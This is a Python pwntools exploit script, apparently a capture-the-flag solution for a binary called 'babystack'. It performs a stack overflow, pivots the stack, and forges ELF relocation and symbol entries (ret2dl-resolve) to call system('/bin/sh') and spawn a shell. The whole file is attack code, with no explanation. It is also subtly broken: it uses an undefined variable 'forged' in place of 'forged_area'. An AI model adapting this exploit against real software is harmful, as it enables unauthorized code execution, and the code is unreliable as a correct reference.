from pwn import *

p = process("./babystack")
elf = ELF("./babystack")
dl_resol = 0x80482f0
buf = 0x804af00
leave_ret = 0x8048455
SYMTAB = 0x080481cc
STRTAB = 0x0804822c
JMPREL = 0x080482b0

# Call read(0, buf, 0x80)
buffer = ""
buffer += "A"*40
buffer += p32(buf)
buffer += p32(elf.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80)

# Compute offsets and forged structures
forged_area = buf + 0x14
rel_offset = forged - JMPREL
elf32_sym = forged_area + 0x8

index_sym = (elf32_sym - SYMTAB) / 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(elf.got["read"]) + p32(r_info)
st_name = (elf32_sym + 0x20) - STRTAB # "system"
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12) 

# Payload 2
buffer2 = "AAAA"
buffer2 += p32(dl_resol)
buffer2 += p32(rel_offset)
buffer2 += "AAAA"
buffer2 += p32(buf + 0x33)
buffer2 += elf32_rel		# buf + 0x14
buffer2 += elf32_sym_struct	# buf + 0x1c
buffer2 += "system\x00"		# buf + 0x2c
buffer2 += "/bin/sh\x00"	# buf + 0x33
pad = 0x80 - len(buffer2)
buffer2 += "A" * pad

p.send(buffer + buffer2)
p.interactive()
